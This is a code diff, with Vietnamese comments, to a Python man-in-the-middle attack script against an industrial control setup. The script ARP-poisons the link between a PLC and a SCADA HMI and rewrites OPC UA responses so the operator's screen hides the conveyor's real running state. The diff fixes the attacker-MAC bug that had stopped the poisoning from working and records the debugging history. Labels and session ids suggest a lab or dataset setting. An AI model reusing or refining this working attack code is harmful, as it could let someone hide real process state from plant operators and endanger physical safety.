@@ -30,22 +30,26 @@ Co che cua module nay:
   3. Khi ket thuc cua so STOP (restart that), tat concealment de HMI dong bo
      lai voi trang thai that.
 
-QUAN TRONG -- gateway.py (web_scada/backend/app/opcua/gateway.py) cap nhat
-gia tri tag qua HAI duong doc lap: (a) Subscription/PublishResponse (co
-ClientHandle, minh che duoc qua conceal_bangtai_running), VA (b) mot poll
-loop rieng moi ~1s goi node.read_data_value() cho TUNG tag (_poll_loop /
-_read_tag_once) -- day la ReadRequest/ReadResponse, KHONG co ClientHandle,
-nen khong khop pattern cua conceal_bangtai_running va se lam LO gia tri that
-sau toi da ~1 chu ky poll. Da kiem chung thuc te: nguoi dung bao WinCC chi
-"che" duoc vai giay dau roi tu dong hien lai trang thai dung -- dung khop voi
-co che nay. conceal_bangtai_read_response() + is_bangtai_read_request() ben
-duoi vá lo hong nay bang cach: theo doi khung HMI->PLC co chua chuoi NodeId
-"BangTai" (danh dau "ReadResponse ke tiep tu PLC->HMI la cua BangTai"), roi
-ep gia tri Boolean dau tien trong khung PLC->HMI ke tiep do. Day van la
-heuristic tuong quan theo THU TU GOI TIN (khong parse day du mang NodesToRead
-cua ReadRequest) -- co the sai neu 1 PublishResponse xen vao dung giua cap
-Request/Response do (hiem, nhung khong loai tru), ghi ro de khong phong dai
-muc do chinh xac trong bao cao.
+LICH SU DEBUG (giu lai de khong lap lai sai lam): ban dau nghi ngo gateway.py
+(web_scada/backend/app/opcua/gateway.py) co 2 duong cap nhat doc lap --
+Subscription/PublishResponse (co ClientHandle, che duoc qua
+conceal_bangtai_running) VA mot poll loop rieng moi ~1s qua ReadRequest/
+ReadResponse (_poll_loop/_read_tag_once, KHONG co ClientHandle) -- nen da
+them conceal_bangtai_read_response()/is_bangtai_read_request() de che ca 2
+duong. Gia thuyet do VAN DUNG VE MAT LY THUYET (poll loop la duong leak that
+neu chi che duong Publish), nhung khong phai nguyen nhan cua lan fail da do
+duoc: label CSV cho thay intercepted=0 O CA 3 LAN CHAY -- tuc la KHONG co goi
+OPC UA nao lot vao MITM ca, nen ca 2 co che che gia tri deu chua bao gio duoc
+thuc thi tren du lieu that. Nguyen nhan that: get_if_hwaddr(iface) tren Npcap/
+Windows tra ve MAC rong (00:00:00:00:00:00), va arp_poison() truoc day khong
+set hwsrc tuong minh nen scapy dien MAC rong do vao goi ARP -- nan nhan nhan
+duoc poison "IP nay o MAC rong", vo nghia, KHONG redirect duoc traffic. Da vá
+bang resolve_attacker_mac() (copy tu tests/test_mitm_opcua_spoof.py, da tung
+giai quyet dung bug nay o file do) + truyen attacker_mac tuong minh vao
+arp_poison(). conceal_bangtai_read_response() van giu lai vi van co gia tri
+phong ngua that (mot khi ARP da redirect duoc, poll loop leak van la nguy co
+that su), nhung dung coi day la thu da "kiem chung thuc te" -- chua co lan
+chay nao voi ARP hoat dong dung de kiem chung dieu do.
 
 GIOI HAN THAT (khong phong dai, quan trong khi viet bao cao): day la
 concealment o TANG MANG (ARP poison + sua goi tin OPC UA giua PLC va HMI),
@@ -208,6 +212,42 @@ def conceal_bangtai_read_response(payload: bytes) -> bytes:
     return bytes(payload)
 
 
+def _is_null_mac(mac):
+    return (not mac) or mac.lower() in ("00:00:00:00:00:00", "")
+
+
+def resolve_attacker_mac(iface, plc_ip):
+    """get_if_hwaddr(iface) tren Npcap/Windows hay tra ve MAC rong (bug da
+    biet -- xem tests/test_mitm_opcua_spoof.py). Neu khong bat duoc dieu nay,
+    ARP poison gui hwsrc rong (scapy tu dien khi khong set hwsrc, cung dua
+    tren cung co che phat hien loi nay) -- nan nhan khong the gui traffic ve
+    dung may attacker, redirect luon la 0 goi. Thu nhieu cach, tra MAC hop le
+    dau tien."""
+    try:
+        mac = get_if_hwaddr(iface)
+        if not _is_null_mac(mac):
+            return mac, "get_if_hwaddr"
+    except Exception:
+        pass
+    try:
+        from scapy.all import conf
+        _, attacker_ip, _ = conf.route.route(plc_ip)
+        from scapy.arch.windows import get_windows_if_list
+        for i in get_windows_if_list():
+            if attacker_ip in (i.get("ips") or []) and not _is_null_mac(i.get("mac")):
+                return i["mac"], f"windows_if_list(ip={attacker_ip})"
+    except Exception:
+        pass
+    try:
+        from scapy.all import conf
+        mac = getattr(conf.iface, "mac", None)
+        if not _is_null_mac(mac):
+            return mac, "conf.iface.mac"
+    except Exception:
+        pass
+    return None, "FAILED"
+
+
 def get_mac(ip, timeout=2):
     try:
         ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=timeout, verbose=False)
@@ -216,9 +256,9 @@ def get_mac(ip, timeout=2):
         return None
 
 
-def arp_poison(plc_mac, hmi_mac, plc_ip, hmi_ip, iface):
-    poison_to_hmi = Ether(dst=hmi_mac) / ARP(op=2, pdst=hmi_ip, hwdst=hmi_mac, psrc=plc_ip)
-    poison_to_plc = Ether(dst=plc_mac) / ARP(op=2, pdst=plc_ip, hwdst=plc_mac, psrc=hmi_ip)
+def arp_poison(plc_mac, hmi_mac, plc_ip, hmi_ip, iface, attacker_mac):
+    poison_to_hmi = Ether(dst=hmi_mac) / ARP(op=2, pdst=hmi_ip, hwdst=hmi_mac, psrc=plc_ip, hwsrc=attacker_mac)
+    poison_to_plc = Ether(dst=plc_mac) / ARP(op=2, pdst=plc_ip, hwdst=plc_mac, psrc=hmi_ip, hwsrc=attacker_mac)
     while not stop_all.is_set():
         sendp(poison_to_hmi, iface=iface, verbose=False)
         sendp(poison_to_plc, iface=iface, verbose=False)
@@ -268,8 +308,12 @@ def mitm_packet_callback(pkt, plc_ip, hmi_ip, iface):
             sendp(Ether(dst=plc_mac) / pkt[IP], iface=iface, verbose=False)
 
 
-def mitm_thread_main(plc_ip, hmi_ip, iface, plc_mac, hmi_mac):
-    arp_t = threading.Thread(target=arp_poison, args=(plc_mac, hmi_mac, plc_ip, hmi_ip, iface), daemon=True)
+def mitm_thread_main(plc_ip, hmi_ip, iface, plc_mac, hmi_mac, attacker_mac):
+    arp_t = threading.Thread(
+        target=arp_poison,
+        args=(plc_mac, hmi_mac, plc_ip, hmi_ip, iface, attacker_mac),
+        daemon=True,
+    )
     arp_t.start()
     time.sleep(2)
     try:
@@ -305,9 +349,19 @@ def run(args):
                     note="mac_resolve_failed")
         return
 
+    attacker_mac, mac_method = resolve_attacker_mac(args.iface, args.target)
+    print(f"[*] Attacker MAC = {attacker_mac}  (resolve qua: {mac_method})")
+    if _is_null_mac(attacker_mac):
+        print("[ERR] Khong resolve duoc attacker MAC hop le -- ARP poison se vo tac dung, huy.")
+        write_label(args.label_file, label_prefix, "END",
+                    args.session_id, args.host_id,
+                    episode_id=args.episode_id, day=args.day,
+                    note="attacker_mac_resolve_failed")
+        return
+
     mitm_t = threading.Thread(
         target=mitm_thread_main,
-        args=(args.target, args.hmi_ip, args.iface, plc_mac, hmi_mac),
+        args=(args.target, args.hmi_ip, args.iface, plc_mac, hmi_mac, attacker_mac),
         daemon=True,
     )
     mitm_t.start()
